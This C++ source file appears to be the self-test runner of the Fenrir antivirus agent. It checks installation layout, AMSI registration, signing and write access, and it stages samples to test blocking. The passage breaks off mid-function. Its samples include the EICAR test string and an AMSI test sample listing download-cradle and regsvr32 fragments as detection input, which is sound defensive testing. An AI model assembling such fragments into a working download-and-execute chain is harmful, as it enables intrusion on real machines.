#include <winsock2.h>
#include "SelfTestRunner.h"

#include <psapi.h>

#include <algorithm>
#include <chrono>
#include <cstring>
#include <cwchar>
#include <filesystem>
#include <fstream>
#include <limits>
#include <numeric>
#include <optional>
#include <string>
#include <thread>
#include <vector>

#include "../../../sensor/etw/include/ProcessEtwSensor.h"
#include "../../../sensor/wfp/include/NetworkIsolationManager.h"
#include "AgentConfig.h"
#include "AmsiScanEngine.h"
#include "ContextAwareness.h"
#include "CryptoUtils.h"
#include "EndpointClient.h"
#include "HardeningManager.h"
#include "LocalSecurity.h"
#include "LocalControlChannel.h"
#include "PatchOrchestrator.h"
#include "RealtimeProtectionBroker.h"
#include "ReputationLookup.h"
#include "RuntimeDatabase.h"
#include "RuntimeTrustValidator.h"
#include "ScanEngine.h"
#include "StringUtils.h"
#include "UpdaterService.h"
#include "WscCoexistenceManager.h"

namespace antivirus::agent {
namespace {

constexpr wchar_t kAmsiProviderName[] = L"AntiVirus AMSI Provider";
constexpr wchar_t kMinifilterServiceName[] = L"AntivirusMinifilter";
constexpr wchar_t kServiceExecutableName[] = L"fenrir-agent-service.exe";
constexpr wchar_t kAmsiProviderDllName[] = L"fenrir-amsi-provider.dll";
constexpr wchar_t kSignatureBundleRelativePath[] = L"signatures\\default-signatures.tsv";
constexpr char kDiskBlockingSample[] =
  "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
constexpr char kExecutionBlockingSample[] =
  "# Fenrir self-test execution marker\n"
  "$marker = 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE'\n"
  "Write-Output $marker\n";
constexpr char kCleanwareDiskSample[] =
  "Fenrir cleanware validation sample\n"
  "This file models benign business content and should not trigger malware blocking.\n"
  "Quarterly planning notes: agenda, staffing, and finance follow-up items.\n";
constexpr char kCleanwareExecutionSample[] =
  "# Fenrir cleanware self-test marker\n"
  "$status = 'fenrir-cleanware-selftest'\n"
  "Write-Output $status\n";
constexpr char kBrowserDownloadInstallSample[] =
  "Fenrir benign download/install validation sample\n"
  "Contains routine business installation notes and no script execution content.\n";
constexpr char kPhase2RansomwareBurstSample[] =
  "Fenrir Phase 2 ransomware-burst simulation payload for write-churn validation.\n";
constexpr char kPhase2BenignBulkIoSample[] =
  "Fenrir Phase 2 benign bulk I/O simulation payload for false-positive guardrails.\n";
constexpr std::size_t kDefaultCorpusFileLimit = 400;
constexpr std::size_t kMaxCorpusFileLimit = 5000;

std::wstring JsonEscape(const std::wstring& value) { return Utf8ToWide(EscapeJsonString(value)); }

std::wstring ToLowerCopy(std::wstring value) {
  std::transform(value.begin(), value.end(), value.begin(),
                 [](const wchar_t ch) { return static_cast<wchar_t>(std::towlower(ch)); });
  return value;
}

bool ContainsCaseInsensitive(const std::wstring& text, const std::wstring& needle) {
  if (needle.empty()) {
    return true;
  }

  return ToLowerCopy(text).find(ToLowerCopy(needle)) != std::wstring::npos;
}

struct SignedSystemBinaryCandidate {
  std::filesystem::path path;
  std::wstring signer;
};

void AddCheck(SelfTestReport& report, const std::wstring& id, const std::wstring& name, const SelfTestStatus status,
              const std::wstring& details, const std::wstring& remediation = {}) {
  report.checks.push_back(SelfTestCheck{
      .id = id,
      .name = name,
      .status = status,
      .details = details,
      .remediation = remediation,
  });
}

bool PathExists(const std::filesystem::path& path) {
  std::error_code error;
  return std::filesystem::exists(path, error) && !error;
}

bool IsProcessElevated() {
  HANDLE token = nullptr;
  if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token) == FALSE) {
    return false;
  }

  TOKEN_ELEVATION elevation{};
  DWORD size = 0;
  const auto ok =
      GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size) != FALSE && elevation.TokenIsElevated != 0;
  CloseHandle(token);
  return ok;
}

std::wstring QueryServiceState(const wchar_t* serviceName) {
  const auto scManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
  if (scManager == nullptr) {
    return {};
  }

  const auto service = OpenServiceW(scManager, serviceName, SERVICE_QUERY_STATUS);
  if (service == nullptr) {
    CloseServiceHandle(scManager);
    return {};
  }

  SERVICE_STATUS_PROCESS status{};
  DWORD bytesNeeded = 0;
  std::wstring state = L"unknown";
  if (QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&status), sizeof(status),
                           &bytesNeeded) != FALSE) {
    switch (status.dwCurrentState) {
      case SERVICE_RUNNING:
        state = L"running";
        break;
      case SERVICE_STOPPED:
        state = L"stopped";
        break;
      case SERVICE_START_PENDING:
        state = L"start_pending";
        break;
      case SERVICE_STOP_PENDING:
        state = L"stop_pending";
        break;
      default:
        state = L"present";
        break;
    }
  }

  CloseServiceHandle(service);
  CloseServiceHandle(scManager);
  return state;
}

bool RegistryKeyExists(HKEY root, const std::wstring& subKey) {
  HKEY key = nullptr;
  const auto status = RegOpenKeyExW(root, subKey.c_str(), 0, KEY_READ, &key);
  if (status == ERROR_SUCCESS && key != nullptr) {
    RegCloseKey(key);
    return true;
  }
  return false;
}

std::wstring ReadRegistryDefaultString(HKEY root, const std::wstring& subKey) {
  HKEY key = nullptr;
  if (RegOpenKeyExW(root, subKey.c_str(), 0, KEY_READ, &key) != ERROR_SUCCESS) {
    return {};
  }

  DWORD type = 0;
  DWORD size = 0;
  std::wstring value;
  if (RegQueryValueExW(key, nullptr, nullptr, &type, nullptr, &size) == ERROR_SUCCESS &&
      (type == REG_SZ || type == REG_EXPAND_SZ) && size >= sizeof(wchar_t)) {
    value.resize(size / sizeof(wchar_t));
    if (RegQueryValueExW(key, nullptr, nullptr, nullptr, reinterpret_cast<LPBYTE>(value.data()), &size) ==
        ERROR_SUCCESS) {
      while (!value.empty() && value.back() == L'\0') {
        value.pop_back();
      }
    } else {
      value.clear();
    }
  }

  RegCloseKey(key);
  return value;
}

std::optional<std::wstring> FindAmsiProviderKey() {
  HKEY providers = nullptr;
  if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\AMSI\\Providers", 0, KEY_READ, &providers) !=
      ERROR_SUCCESS) {
    return std::nullopt;
  }

  wchar_t nameBuffer[256] = {};
  DWORD index = 0;
  while (true) {
    DWORD nameLength = static_cast<DWORD>(std::size(nameBuffer));
    const auto status = RegEnumKeyExW(providers, index, nameBuffer, &nameLength, nullptr, nullptr, nullptr, nullptr);
    if (status == ERROR_NO_MORE_ITEMS) {
      break;
    }
    if (status == ERROR_SUCCESS) {
      const auto keyPath = std::wstring(L"SOFTWARE\\Microsoft\\AMSI\\Providers\\") +
                           std::wstring(nameBuffer, nameLength);
      if (ReadRegistryDefaultString(HKEY_LOCAL_MACHINE, keyPath) == kAmsiProviderName) {
        RegCloseKey(providers);
        return keyPath;
      }
    }
    ++index;
  }

  RegCloseKey(providers);
  return std::nullopt;
}

bool IsProbablyPrivilegeBoundary(const std::wstring& value) {
  const auto lower = std::wstring([&value] {
    std::wstring lowered = value;
    std::transform(lowered.begin(), lowered.end(), lowered.begin(),
                   [](const wchar_t ch) { return static_cast<wchar_t>(std::towlower(ch)); });
    return lowered;
  }());
  return lower.find(L"access") != std::wstring::npos || lower.find(L"denied") != std::wstring::npos ||
         lower.find(L"privilege") != std::wstring::npos || lower.find(L"elevat") != std::wstring::npos ||
         lower.find(L"service context") != std::wstring::npos;
}

std::size_t ResolveCorpusFileLimit() {
  const auto raw = ReadEnvironmentVariable(L"ANTIVIRUS_PHASE1_CORPUS_MAX_FILES");
  if (raw.empty()) {
    return kDefaultCorpusFileLimit;
  }

  try {
    const auto parsed = std::stoull(raw);
    if (parsed == 0) {
      return kDefaultCorpusFileLimit;
    }
    return static_cast<std::size_t>(std::min<unsigned long long>(parsed, kMaxCorpusFileLimit));
  } catch (...) {
    return kDefaultCorpusFileLimit;
  }
}

constexpr char kPhase3AmsiMaliciousSample[] =
  "downloadstring :8443\n"
  "assembly.load(\n"
  "regsvr32 \n";
constexpr char kPhase3AmsiBenignSample[] =
  "Get-ChildItem Documents *.txt\n"
  "Write-Output report\n";

std::vector<std::filesystem::path> CollectCorpusSampleFiles(const std::filesystem::path& root,
                                                            const std::size_t fileLimit, bool* truncated) {
  if (truncated != nullptr) {
    *truncated = false;
  }

  std::vector<std::filesystem::path> files;
  if (fileLimit == 0) {
    return files;
  }

  std::error_code error;
  if (std::filesystem::is_regular_file(root, error)) {
    files.push_back(root);
    return files;
  }

  error.clear();
  if (!std::filesystem::is_directory(root, error)) {
    return files;
  }

  for (std::filesystem::recursive_directory_iterator iterator(
           root, std::filesystem::directory_options::skip_permission_denied, error);
       iterator != std::filesystem::recursive_directory_iterator(); iterator.increment(error)) {
    if (error) {
      error.clear();
      continue;
    }

    if (iterator->is_regular_file(error)) {
      files.push_back(iterator->path());
      if (files.size() >= fileLimit) {
        if (truncated != nullptr) {
          *truncated = true;
        }
        break;
      }
    }

    if (error) {
      error.clear();
    }
  }

  std::sort(files.begin(), files.end());
  return files;
}

std::optional<SignedSystemBinaryCandidate> FindSignedSystemBinaryCandidate() {
  std::vector<std::filesystem::path> candidates;
  const auto windowsRoot = std::filesystem::path(ReadEnvironmentVariable(L"WINDIR"));
  if (!windowsRoot.empty()) {
    candidates.push_back(windowsRoot / L"System32" / L"notepad.exe");
    candidates.push_back(windowsRoot / L"System32" / L"cmd.exe");
    candidates.push_back(windowsRoot / L"System32" / L"WindowsPowerShell" / L"v1.0" / L"powershell.exe");
    candidates.push_back(windowsRoot / L"explorer.exe");
  }

  candidates.push_back(std::filesystem::path(L"C:\\Windows\\System32\\notepad.exe"));
  candidates.push_back(std::filesystem::path(L"C:\\Windows\\System32\\cmd.exe"));

  std::sort(candidates.begin(), candidates.end());
  candidates.erase(std::unique(candidates.begin(), candidates.end()), candidates.end());

  for (const auto& candidate : candidates) {
    if (!PathExists(candidate) || !VerifyFileAuthenticodeSignature(candidate)) {
      continue;
    }

    const auto signer = QueryFileSignerSubject(candidate);
    if (signer.empty()) {
      continue;
    }

    return SignedSystemBinaryCandidate{.path = candidate, .signer = signer};
  }

  return std::nullopt;
}

std::filesystem::path ResolveSignatureBundlePath(const std::filesystem::path& installRoot) {
  const auto envPath = ReadEnvironmentVariable(L"ANTIVIRUS_SIGNATURE_BUNDLE_PATH");
  if (!envPath.empty()) {
    return std::filesystem::path(envPath);
  }

  const auto candidate = installRoot / kSignatureBundleRelativePath;
  if (PathExists(candidate)) {
    return candidate;
  }

  const auto repoCandidate = std::filesystem::current_path() / L"agent" / L"windows" / L"signatures" /
                             L"default-signatures.tsv";
  return repoCandidate;
}

std::filesystem::path BuildSelfTestValidationRoot(const AgentConfig& config) {
  std::error_code error;
  auto root = std::filesystem::temp_directory_path(error);
  if (error || root.empty()) {
    root = config.runtimeDatabasePath.parent_path();
  }
  if (root.empty()) {
    root = std::filesystem::current_path();
  }
  return root / (L"fenrir-phase1-selftest-" + GenerateGuidString());
}

bool WriteSelfTestSample(const std::filesystem::path& path, const char* content) {
  std::error_code error;
  std::filesystem::create_directories(path.parent_path(), error);
  if (error) {
    return false;
  }

  std::ofstream output(path, std::ios::binary | std::ios::trunc);
  if (!output.is_open()) {
    return false;
  }

  output.write(content, static_cast<std::streamsize>(std::char_traits<char>::length(content)));
  return output.good();
}

bool WriteSelfTestUtf8File(const std::filesystem::path& path, const std::wstring& content) {
  std::error_code error;
  std::filesystem::create_directories(path.parent_path(), error);
  if (error) {
    return false;
  }

  std::ofstream output(path, std::ios::binary | std::ios::trunc);
  if (!output.is_open()) {
    return false;
  }

  const auto utf8Content = WideToUtf8(content);
  output.write(utf8Content.data(), static_cast<std::streamsize>(utf8Content.size()));
  return output.good();
}

bool ProbeDirectoryWriteAccess(const std::filesystem::path& directoryPath, const std::wstring& label,
                               std::wstring* failureDetails) {
  if (directoryPath.empty()) {
    if (failureDetails != nullptr) {
      *failureDetails = label + L" path is empty.";
    }
    return false;
  }

  std::error_code error;
  std::filesystem::create_directories(directoryPath, error);
  if (error) {
    if (failureDetails != nullptr) {
      *failureDetails = label + L" path could not be created at " + directoryPath.wstring() + L".";
    }
    return false;
  }

  const auto probePath = directoryPath / (L"fenrir-selftest-writecheck-" + GenerateGuidString() + L".tmp");
  std::ofstream probeFile(probePath, std::ios::binary | std::ios::trunc);
  if (!probeFile.is_open()) {
    if (failureDetails != nullptr) {
      *failureDetails = label + L" path denied write access at " + directoryPath.wstring() + L".";
    }
    return false;
  }

  probeFile << "fenrir-self-test";
  probeFile.close();

  std::filesystem::remove(probePath, error);
  if (error) {
    if (failureDetails != nullptr) {
      *failureDetails = label + L" path wrote the probe file but cleanup failed at " + probePath.wstring() + L".";
    }
    return false;
  }

  return true;
}

template <std::size_t Capacity>
void CopyWideField(wchar_t (&target)[Capacity], const std::wstring& value) {
  static_assert(Capacity > 0);
  const auto length = std::min<std::size_t>(value.size(), Capacity - 1);
  if (length > 0) {
    std::wmemcpy(target, value.data(), length);
  }
  target[length] = L'\0';
}

bool IsBlockingDisposition(const VerdictDisposition disposition) {
  return disposition == VerdictDisposition::Block || disposition == VerdictDisposition::Quarantine;
}

std::wstring FirstReasonCode(const ScanFinding& finding) {
  if (finding.verdict.reasons.empty()) {
    return L"none";
  }
  return finding.verdict.reasons.front().code;
}

bool FindingHasReasonCode(const ScanFinding& finding, const std::wstring& code) {
  return std::any_of(finding.verdict.reasons.begin(), finding.verdict.reasons.end(),
                     [&code](const auto& reason) { return reason.code == code; });
}

bool FindingHasReasonPrefix(const ScanFinding& finding, const std::wstring& prefix) {
  return std::any_of(finding.verdict.reasons.begin(), finding.verdict.reasons.end(),
                     [&prefix](const auto& reason) { return reason.code.starts_with(prefix); });
}

std::wstring StatusToString(const SelfTestStatus status) {
  switch (status) {
    case SelfTestStatus::Pass:
      return L"pass";
    case SelfTestStatus::Warning:
      return L"warning";
    case SelfTestStatus::Fail:
    default:
      return L"fail";
  }
}

std::optional<std::uint64_t> QueryCurrentProcessWorkingSetBytes() {
  PROCESS_MEMORY_COUNTERS_EX counters{};
  if (GetProcessMemoryInfo(GetCurrentProcess(), reinterpret_cast<PPROCESS_MEMORY_COUNTERS>(&counters),
                           sizeof(counters)) == FALSE) {
    return std::nullopt;
  }

  return static_cast<std::uint64_t>(counters.WorkingSetSize);
}

struct CpuTimes {
  ULONGLONG kernel{0};
  ULONGLONG user{0};
};

std::optional<CpuTimes> ReadCurrentProcessCpuTimes() {
  FILETIME createTime{};
  FILETIME exitTime{};
  FILETIME kernelTime{};
  FILETIME userTime{};
  if (GetProcessTimes(GetCurrentProcess(), &createTime, &exitTime, &kernelTime, &userTime) == FALSE) {
    return std::nullopt;
  }

  const auto toUInt64 = [](const FILETIME& value) {
    ULARGE_INTEGER merged{};
    merged.LowPart = value.dwLowDateTime;
    merged.HighPart = value.dwHighDateTime;
    return merged.QuadPart;
  };

  return CpuTimes{.kernel = toUInt64(kernelTime), .user = toUInt64(userTime)};
}

std::optional<int> SampleCurrentProcessCpuPercent() {
  const auto first = ReadCurrentProcessCpuTimes();
  if (!first.has_value()) {
    return std::nullopt;
  }

  const auto firstSampleTime = std::chrono::steady_clock::now();
  std::this_thread::sleep_for(std::chrono::milliseconds(200));
  const auto second = ReadCurrentProcessCpuTimes();
  const auto secondSampleTime = std::chrono::steady_clock::now();
  if (!second.has_value()) {
    return std::nullopt;
  }

  const auto kernelDelta = second->kernel - first->kernel;
  const auto userDelta = second->user - first->user;
  const auto processDelta100ns = kernelDelta + userDelta;

  const auto elapsed =
      std::chrono::duration_cast<std::chrono::nanoseconds>(secondSampleTime - firstSampleTime).count();
  if (elapsed <= 0) {
    return std::nullopt;
  }

  SYSTEM_INFO systemInfo{};
  GetSystemInfo(&systemInfo);
  const auto processorCount = std::max<ULONGLONG>(1, static_cast<ULONGLONG>(systemInfo.dwNumberOfProcessors));
  const auto elapsed100ns = static_cast<ULONGLONG>(elapsed / 100);
  if (elapsed100ns == 0) {
    return std::nullopt;
  }

  const auto denominator = elapsed100ns * processorCount;
  if (denominator == 0) {
    return std::nullopt;
  }

  const auto percent = static_cast<int>((processDelta100ns * 100ULL + (denominator / 2ULL)) / denominator);
  return std::clamp(percent, 0, 100);
}

int ResolveDestinationReputationBlockThresholdForSelfTest() {
  const auto raw = ReadEnvironmentVariable(L"ANTIVIRUS_DESTINATION_REPUTATION_BLOCK_THRESHOLD");
  if (raw.empty()) {
    return 30;
  }

  try {
    return std::clamp(std::stoi(raw), 0, 100);
  } catch (...) {
    return 30;
  }
}

enum class NetworkActionBand {
  Audit,
  Warn,
  Block,
};

NetworkActionBand DetermineDestinationActionBand(const ReputationLookupResult& intel,
                                                const int blockThreshold) {
  if (intel.malicious && static_cast<int>(intel.trustScore) <= blockThreshold) {
    return NetworkActionBand::Block;
  }

  if (intel.malicious || intel.verdict == L"unknown") {
    return NetworkActionBand::Warn;
  }

  return NetworkActionBand::Audit;
}

std::wstring NetworkActionBandToString(const NetworkActionBand band) {
  switch (band) {
    case NetworkActionBand::Block:
      return L"block";
    case NetworkActionBand::Warn:
      return L"warn";
    case NetworkActionBand::Audit:
    default:
      return L"audit";
  }
}

struct WindowsVersionInfo {
  DWORD major{0};
  DWORD minor{0};
  DWORD build{0};
};

std::optional<WindowsVersionInfo> QueryWindowsVersionInfo() {
  using RtlGetVersionFn = LONG(WINAPI*)(PRTL_OSVERSIONINFOW);

  const auto ntdll = GetModuleHandleW(L"ntdll.dll");
  if (ntdll == nullptr) {
    return std::nullopt;
  }

  const auto rtlGetVersion = reinterpret_cast<RtlGetVersionFn>(GetProcAddress(ntdll, "RtlGetVersion"));
  if (rtlGetVersion == nullptr) {
    return std::nullopt;
  }

  RTL_OSVERSIONINFOW info{};
  info.dwOSVersionInfoSize = sizeof(info);
  if (rtlGetVersion(&info) != 0) {
    return std::nullopt;
  }

  return WindowsVersionInfo{
      .major = info.dwMajorVersion,
      .minor = info.dwMinorVersion,
      .build = info.dwBuildNumber,
  };
}

std::wstring ClassifyWindowsFamily(const WindowsVersionInfo& info) {
  if (info.major == 10 && info.build >= 22000) {
    return L"windows11";
  }

  if (info.major == 10) {
    return L"windows10";
  }

  return L"unsupported";
}

}  // namespace

SelfTestReport RunSelfTest(const AgentConfig& config, const std::filesystem::path& installRoot) {
  SelfTestReport report{
      .generatedAt = CurrentUtcTimestamp(),
      .overallStatus = L"pass",
      .checks = {},
  };
  const auto elevated = IsProcessElevated();

  try {
    RuntimeDatabase database(config.runtimeDatabasePath);
    const auto telemetry = database.LoadTelemetryQueue();
    AddCheck(report, L"runtime_database", L"Runtime database", SelfTestStatus::Pass,
             L"Opened the local SQLite runtime store and read " + std::to_wstring(telemetry.size()) +
                 L" queued telemetry record(s).");
  } catch (const std::exception& error) {
    AddCheck(report, L"runtime_database", L"Runtime database", SelfTestStatus::Fail, Utf8ToWide(error.what()),
             L"Confirm the runtime path is writable and the SQLite bundle is present.");
  }

  const auto servicePath = installRoot / kServiceExecutableName;
  const auto providerDllPath = installRoot / kAmsiProviderDllName;
  const auto signatureBundlePath = ResolveSignatureBundlePath(installRoot);
  AddCheck(report, L"release_layout", L"Release layout",
           PathExists(servicePath) && PathExists(providerDllPath) ? SelfTestStatus::Pass : SelfTestStatus::Fail,
           L"Service binary: " + servicePath.wstring() + L"; AMSI provider: " + providerDllPath.wstring(),
           L"Run the release layout script so the agent executable and AMSI DLL are staged together.");

  AddCheck(report, L"signature_bundle", L"Signature bundle",
           PathExists(signatureBundlePath) ? SelfTestStatus::Pass : SelfTestStatus::Warning,
           PathExists(signatureBundlePath) ? L"Loaded external signature content from " + signatureBundlePath.wstring()
                                           : L"No external signature bundle was found. The engine will fall back to "
                                             L"compiled heuristics only.",
           L"Ship signatures\\default-signatures.tsv with the release layout or set ANTIVIRUS_SIGNATURE_BUNDLE_PATH.");

  const auto cleanwareSignerCatalogPath = config.cleanwareSignerListPath;
  const auto knownGoodHashCatalogPath = config.knownGoodHashListPath;
  const auto observeOnlyCatalogPath = config.observeOnlyRuleListPath;
  const auto intelCatalogsPresent = PathExists(cleanwareSignerCatalogPath) && PathExists(knownGoodHashCatalogPath) &&
                                    PathExists(observeOnlyCatalogPath);
  AddCheck(report, L"phase2_intel_catalogs", L"Phase 2 local intelligence catalogs",
           intelCatalogsPresent ? SelfTestStatus::Pass : SelfTestStatus::Warning,
           L"Cleanware signers: " + cleanwareSignerCatalogPath.wstring() + L"; known-good hashes: " +
               knownGoodHashCatalogPath.wstring() + L"; observe-only rules: " + observeOnlyCatalogPath.wstring() +
               L".",
           L"Ship default-cleanware-signers.tsv, default-known-good-hashes.tsv, and default-observe-only.tsv with the signatures bundle.");

  const auto amsiProviderKey = FindAmsiProviderKey();
  AddCheck(report, L"amsi_registration", L"AMSI provider registration",
           amsiProviderKey.has_value() ? SelfTestStatus::Pass : SelfTestStatus::Warning,
           amsiProviderKey.has_value()
               ? L"AMSI registration is present at HKLM\\" + *amsiProviderKey
               : L"The AntiVirus AMSI provider is not registered in HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers.",
           L"Run fenrir-agent-service.exe --register-amsi-provider from an elevated context.");

  if (PathExists(servicePath)) {
    const auto signedBinary = VerifyFileAuthenticodeSignature(servicePath);
    AddCheck(report, L"binary_signing", L"Binary signing",
             signedBinary ? SelfTestStatus::Pass : SelfTestStatus::Warning,
             signedBinary ? L"The service binary has a valid Authenticode signature."
                          : L"The service binary is not Authenticode-signed in this build context.",
             L"Sign production binaries before packaging, rollout, and protected-service onboarding.");
  }

  const auto runtimeValidation = ValidateRuntimePaths(config);
  AddCheck(report, L"runtime_path_boundaries", L"Trusted runtime boundaries",
           runtimeValidation.trusted ? SelfTestStatus::Pass : SelfTestStatus::Fail,
           runtimeValidation.trusted
               ? L"Trusted runtime root: " + runtimeValidation.runtimeRootPath.wstring() +
                     L"; install root: " + runtimeValidation.installRootPath.wstring()
               : (runtimeValidation.message.empty()
                      ? L"Runtime boundaries are not trusted."
                      : runtimeValidation.message),
           L"Re-run install or repair so runtime database, state, telemetry, update, quarantine, evidence, and journal paths stay within one trusted runtime root.");

  const auto runtimeTrust = ValidateRuntimeTrust(config, installRoot);
  AddCheck(report, L"runtime_trust_validator", L"Runtime trust validator",
           runtimeTrust.trusted ? (runtimeTrust.signatureWarning ? SelfTestStatus::Warning : SelfTestStatus::Pass)
                               : SelfTestStatus::Fail,
           runtimeTrust.message.empty()
               ? L"Runtime trust validation completed without details."
               : runtimeTrust.message,
           runtimeTrust.trusted
               ? (runtimeTrust.signatureWarning
                      ? L"Sign release binaries or set ANTIVIRUS_REQUIRE_SIGNED_RUNTIME=true to enforce signature posture."
                      : L"")
               : L"Run --repair from an elevated context to refresh runtime trust markers and critical service binaries.");

  std::vector<std::wstring> runtimePathWriteFailures;
  const auto appendWriteFailure = [&runtimePathWriteFailures](const std::filesystem::path& path,
                                                              const std::wstring& label) {
    std::wstring failure;
    if (!ProbeDirectoryWriteAccess(path, label, &failure)) {
      runtimePathWriteFailures.push_back(failure);
    }
  };

  const auto runtimeRootPath = runtimeValidation.runtimeRootPath.empty()
                                   ? config.runtimeDatabasePath.parent_path()
                                   : runtimeValidation.runtimeRootPath;
  appendWriteFailure(runtimeRootPath, L"Runtime root");
  appendWriteFailure(config.runtimeDatabasePath.parent_path(), L"Runtime database root");
  appendWriteFailure(config.stateFilePath.parent_path(), L"State root");
  appendWriteFailure(config.telemetryQueuePath.parent_path(), L"Telemetry queue root");
  appendWriteFailure(config.updateRootPath, L"Update root");
  appendWriteFailure(config.journalRootPath, L"Journal root");
  appendWriteFailure(config.quarantineRootPath, L"Quarantine root");
  appendWriteFailure(config.evidenceRootPath, L"Evidence root");

  if (runtimePathWriteFailures.empty()) {
    AddCheck(report, L"runtime_path_write_access", L"Runtime path write access", SelfTestStatus::Pass,
             L"Runtime, state, telemetry, update, journal, quarantine, and evidence paths are writable.");
  } else {
    std::wstring details;
    for (const auto& failure : runtimePathWriteFailures) {
      if (!details.empty()) {
        details += L" | ";
      }
      details += failure;
    }

    AddCheck(report, L"runtime_path_write_access", L"Runtime path write access", SelfTestStatus::Fail, details,
             L"Re-run install or repair from an elevated context so runtime directories are writable by the service account.");
  }

  const auto phaseValidationRoot = BuildSelfTestValidationRoot(config);
  std::error_code phaseValidationRootError;
  std::filesystem::create_directories(phaseValidationRoot, phaseValidationRootError);
  if (phaseValidationRootError) {
    AddCheck(report, L"phase1_disk_blocking", L"Phase 1 disk-time blocking", SelfTestStatus::Fail,
             L"Self-test could not create staged disk-validation artifacts under " + phaseValidationRoot.wstring() + L".",
             L"Ensure the service can write to the local temp/runtime root before running --self-test.");
    AddCheck(report, L"phase1_execution_blocking", L"Phase 1 execution-time blocking", SelfTestStatus::Fail,
             L"Self-test could not prepare the execution-interception validation workspace at " +
                 phaseValidationRoot.wstring() + L".",
             L"Ensure the service can write to local runtime, evidence, and quarantine roots before running --self-test.");
  } else {
    const auto diskSamplePath = phaseValidationRoot / L"phase1-disk-eicar.txt";
    if (!WriteSelfTestSample(diskSamplePath, kDiskBlockingSample)) {
      AddCheck(report, L"phase1_disk_blocking", L"Phase 1 disk-time blocking", SelfTestStatus::Fail,
               L"Self-test could not write the staged disk-scan sample at " + diskSamplePath.wstring() + L".",
               L"Verify local runtime/temp ACLs and retry self-test from the target endpoint context.");
    } else {
      auto diskPolicy = CreateDefaultPolicySnapshot();
      diskPolicy.cloudLookupEnabled = false;
      diskPolicy.quarantineOnMalicious = false;

      const auto diskFinding = ScanFile(diskSamplePath, diskPolicy);
      if (diskFinding.has_value() && IsBlockingDisposition(diskFinding->verdict.disposition)) {
        AddCheck(report, L"phase1_disk_blocking", L"Phase 1 disk-time blocking", SelfTestStatus::Pass,
                 L"ScanFile blocked the staged disk artifact with disposition " +
                     VerdictDispositionToString(diskFinding->verdict.disposition) + L" at confidence " +
                     std::to_wstring(diskFinding->verdict.confidence) + L" (reason " +
                     FirstReasonCode(*diskFinding) + L").");
      } else if (diskFinding.has_value()) {
        AddCheck(report, L"phase1_disk_blocking", L"Phase 1 disk-time blocking", SelfTestStatus::Fail,
                 L"ScanFile returned disposition " + VerdictDispositionToString(diskFinding->verdict.disposition) +
                     L" for the staged artifact (confidence " + std::to_wstring(diskFinding->verdict.confidence) + L").",
                 L"Review scan signatures/heuristics so known-malicious artifacts are blocked on disk.");
      } else {
        AddCheck(report, L"phase1_disk_blocking", L"Phase 1 disk-time blocking", SelfTestStatus::Fail,
                 L"ScanFile produced no finding for the staged disk-validation artifact at " + diskSamplePath.wstring() + L".",
                 L"Review scan signatures/heuristics and exclusions so known-malicious artifacts are detected on disk.");
      }
    }

    const auto executionSamplePath = phaseValidationRoot / L"phase1-execution-eicar.ps1";
    if (!WriteSelfTestSample(executionSamplePath, kExecutionBlockingSample)) {
      AddCheck(report, L"phase1_execution_blocking", L"Phase 1 execution-time blocking", SelfTestStatus::Fail,
               L"Self-test could not write the staged execute-time sample at " + executionSamplePath.wstring() + L".",
               L"Verify local runtime/temp ACLs and retry self-test from the target endpoint context.");
    } else {
      try {
        auto realtimeConfig = config;
        realtimeConfig.runtimeDatabasePath = phaseValidationRoot / L"phase1-runtime.db";
        realtimeConfig.quarantineRootPath = phaseValidationRoot / L"quarantine";
        realtimeConfig.evidenceRootPath = phaseValidationRoot / L"evidence";
        realtimeConfig.scanExcludedPaths.clear();

        std::error_code runtimePathError;
        std::filesystem::create_directories(realtimeConfig.runtimeDatabasePath.parent_path(), runtimePathError);
        std::filesystem::create_directories(realtimeConfig.quarantineRootPath, runtimePathError);
        std::filesystem::create_directories(realtimeConfig.evidenceRootPath, runtimePathError);
        if (runtimePathError) {
          AddCheck(report, L"phase1_execution_blocking", L"Phase 1 execution-time blocking", SelfTestStatus::Fail,
                   L"Self-test could not prepare isolated realtime evidence/quarantine paths under " +
                       phaseValidationRoot.wstring() + L".",
                   L"Ensure runtime, quarantine, and evidence roots are writable before validating execution blocking.");
        } else {
          auto realtimePolicy = CreateDefaultPolicySnapshot();
          realtimePolicy.cloudLookupEnabled = false;
          realtimePolicy.quarantineOnMalicious = false;

          RealtimeProtectionBroker broker(realtimeConfig);
          broker.SetPolicy(realtimePolicy);
          broker.SetDeviceId(L"self-test-device");

          RealtimeFileScanRequest request{};
          request.protocolVersion = ANTIVIRUS_REALTIME_PROTOCOL_VERSION;
          request.requestSize = sizeof(request);
          request.requestId = static_cast<std::uint64_t>(std::chrono::duration_cast<std::chrono::milliseconds>(
                                                               std::chrono::system_clock::now().time_since_epoch())
                                                               .count());
          request.operation = ANTIVIRUS_REALTIME_FILE_OPERATION_EXECUTE;
          request.processId = GetCurrentProcessId();
          request.threadId = GetCurrentThreadId();

          std::error_code absolutePathError;
          auto resolvedExecutionSamplePath = std::filesystem::absolute(executionSamplePath, absolutePathError);
          if (absolutePathError) {
            resolvedExecutionSamplePath = executionSamplePath;
          }

          std::error_code sampleSizeError;
          request.fileSizeBytes = std::filesystem::file_size(resolvedExecutionSamplePath, sampleSizeError);
          if (sampleSizeError) {
            request.fileSizeBytes = 0;
          }

          const auto processImage = PathExists(servicePath) ? servicePath.wstring() : L"fenrir-agent-service.exe";
          CopyWideField(request.correlationId, L"self-test-phase1-execution");
          CopyWideField(request.path, resolvedExecutionSamplePath.wstring());
          CopyWideField(request.processImage, processImage);
          CopyWideField(request.parentImage, processImage);
          CopyWideField(request.commandLine, L"fenrir-agent-service.exe --self-test");
          CopyWideField(request.userSid, L"S-1-5-18");

          const auto outcome = broker.InspectFile(request);
          if (outcome.action == ANTIVIRUS_REALTIME_RESPONSE_ACTION_BLOCK &&
              IsBlockingDisposition(outcome.finding.verdict.disposition)) {
            AddCheck(report, L"phase1_execution_blocking", L"Phase 1 execution-time blocking", SelfTestStatus::Pass,
